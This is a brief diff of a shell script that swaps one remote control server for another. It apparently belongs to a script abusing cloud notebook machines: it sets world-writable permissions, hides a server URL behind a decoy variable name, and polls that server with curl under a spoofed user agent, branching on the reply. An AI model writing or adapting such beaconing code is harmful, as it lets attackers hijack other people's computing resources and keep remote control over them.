@@ -28,11 +28,11 @@ chmod -R 777 ./
 
 cd /notebooks/
 
-google841212121274="http://linuxdistro4.ddns.net/"
+google841212121274="https://workjob84.000webhostapp.com/"
 
 google84="26884"
 
-string=$(curl -s -A "mobile84" http://linuxdistro4.ddns.net/?work=workjob)
+string=$(curl -s -A "mobile84" https://workjob84.000webhostapp.com/?work=workjob)
 if [[ $string == *"16384"* ]]; then
 
 cd /notebooks/
